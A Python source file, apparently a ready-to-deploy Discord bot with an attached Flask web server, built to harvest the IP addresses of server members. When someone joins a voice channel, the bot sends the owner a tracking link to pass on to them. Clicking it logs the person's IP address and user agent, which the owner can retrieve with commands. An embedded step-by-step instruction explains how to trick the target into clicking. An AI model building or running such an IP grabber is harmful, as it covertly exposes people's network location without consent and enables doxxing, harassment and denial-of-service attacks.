import discord
from discord.ext import commands
import json
import datetime
import os
import threading
from flask import Flask, request, jsonify

# ====== ВЕБ-СЕРВЕР ДЛЯ ЗБОРУ IP ======
app = Flask(__name__)

# Словник для зберігання IP
user_ips = {}

@app.route('/')
def home():
    return "✅ Discord IP Tracker Bot працює!"

@app.route('/track/<user_id>')
def track_ip(user_id):
    """Зберігає IP користувача, коли він переходить за посиланням"""
    # Отримуємо реальний IP
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Зберігаємо
    user_ips[user_id] = {
        "ip": ip,
        "time": datetime.datetime.now().isoformat(),
        "user_agent": request.headers.get('User-Agent', 'Unknown')
    }
    
    # Логуємо
    print(f"📥 Збережено IP для {user_id}: {ip}")
    
    return f"""
    <html>
        <head><title>IP записано!</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>✅ Ваш IP записано!</h1>
            <p>IP: {ip}</p>
            <p>Час: {datetime.datetime.now().strftime('%H:%M:%S')}</p>
            <p>Дякуємо! Тепер бот знає ваш IP.</p>
        </body>
    </html>
    """

@app.route('/api/ip/<user_id>')
def get_ip_api(user_id):
    """API для отримання IP (для бота)"""
    if user_id in user_ips:
        return jsonify({"status": "ok", "ip": user_ips[user_id]["ip"]})
    return jsonify({"status": "not_found"})

# ====== DISCORD БОТ ======
TOKEN = "ТВІЙ_ТОКЕН_БОТА"  # ВСТАВ СЮДИ
YOUR_USER_ID = 123456789012345678  # ВСТАВ СВІЙ ID

# Беремо URL з Render
RENDER_URL = os.getenv('RENDER_URL', 'http://localhost:8080')

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Бот {bot.user} запущено!')
    print(f'📊 Підключено до {len(bot.guilds)} серверів')
    print(f'🔗 Веб-сервер: {RENDER_URL}')
    
    try:
        user = await bot.fetch_user(YOUR_USER_ID)
        await user.send(f"✅ Бот запущено!\n🔗 Веб-сервер: {RENDER_URL}")
        print("📨 Тестове повідомлення відправлено!")
    except Exception as e:
        print(f"⚠️ Помилка: {e}")

@bot.event
async def on_voice_state_update(member, before, after):
    if before.channel is None and after.channel is not None:
        user_id = str(member.id)
        
        # Перевіряємо чи вже є IP
        if user_id in user_ips:
            ip = user_ips[user_id]["ip"]
            try:
                user = await bot.fetch_user(YOUR_USER_ID)
                embed = discord.Embed(
                    title="✅ Учасник з IP",
                    description=f"**{member.name}** приєднався!",
                    color=discord.Color.green()
                )
                embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
                embed.add_field(name="🌐 Реальний IP", value=ip, inline=True)
                embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
                embed.set_thumbnail(url=member.display_avatar.url)
                await user.send(embed=embed)
                print(f"📨 Відправлено IP для {member.name}: {ip}")
                return
            except:
                pass
        
        # Якщо IP немає - надсилаємо посилання
        tracking_link = f"{RENDER_URL}/track/{user_id}"
        
        try:
            user = await bot.fetch_user(YOUR_USER_ID)
            embed = discord.Embed(
                title="🔍 НОВИЙ УЧАСНИК!",
                description=f"**{member.name}** приєднався до голосового каналу!",
                color=discord.Color.gold()
            )
            embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
            embed.add_field(name="🆔 ID", value=member.id, inline=True)
            embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
            embed.add_field(
                name="📌 Щоб побачити IP", 
                value=f"Попроси {member.name} перейти за посиланням:",
                inline=False
            )
            embed.add_field(name="🔗 Посилання", value=f"[Натисни тут]({tracking_link})", inline=False)
            embed.add_field(
                name="ℹ️ Інструкція", 
                value="1. Відправ це посилання користувачу\n2. Він переходить\n3. Отримуєш його IP!\n4. Потім пишеш !ip @user",
                inline=False
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            
            await user.send(embed=embed)
            print(f"📨 Відправлено посилання для {member.name}")
            
        except Exception as e:
            print(f"❌ Помилка: {e}")

@bot.command(name='ip')
async def get_ip(ctx, user: discord.Member = None):
    """Отримати реальний IP користувача"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    if user is None:
        user = ctx.author
    
    user_id = str(user.id)
    if user_id in user_ips:
        ip_data = user_ips[user_id]
        embed = discord.Embed(
            title="🌐 Реальний IP",
            color=discord.Color.blue()
        )
        embed.add_field(name="👤 Користувач", value=user.name, inline=True)
        embed.add_field(name="🌐 IP", value=ip_data["ip"], inline=True)
        embed.add_field(name="📅 Час", value=ip_data["time"][:16], inline=True)
        await ctx.send(embed=embed)
    else:
        tracking_link = f"{RENDER_URL}/track/{user_id}"
        embed = discord.Embed(
            title="❌ IP не знайдено",
            description=f"Користувач **{user.name}** ще не переходив за посиланням",
            color=discord.Color.red()
        )
        embed.add_field(name="🔗 Посилання", value=f"[Натисни тут]({tracking_link})", inline=False)
        await ctx.send(embed=embed)

@bot.command(name='ips')
async def list_ips(ctx):
    """Показати всі зібрані IP (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    if not user_ips:
        await ctx.send("📊 Немає зібраних IP")
        return
    
    embed = discord.Embed(
        title="📊 Зібрані IP",
        color=discord.Color.green()
    )
    
    desc = ""
    for uid, data in list(user_ips.items())[:10]:
        desc += f"**ID:** {uid}\n🌐 {data['ip']}\n📅 {data['time'][:16]}\n\n"
    
    embed.description = desc[:4096]
    await ctx.send(embed=embed)

@bot.command(name='clear_ips')
async def clear_ips(ctx):
    """Очистити зібрані IP"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    user_ips.clear()
    await ctx.send("✅ Всі IP очищено!")

# ====== ЗАПУСК ВЕБ-СЕРВЕРА ======
def run_web_server():
    port = int(os.getenv('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

# ====== ЗАПУСК БОТА ======
if __name__ == "__main__":
    if not TOKEN or TOKEN == "ТВІЙ_ТОКЕН_БОТА":
        print("❌ ПОМИЛКА: Встав свій токен в код!")
        exit(1)
    
    # Запускаємо веб-сервер в окремому потоці
    web_thread = threading.Thread(target=run_web_server)
    web_thread.daemon = True
    web_thread.start()
    print("🚀 Веб-сервер запущено!")
    
    # Запускаємо бота
    bot.run(TOKEN)
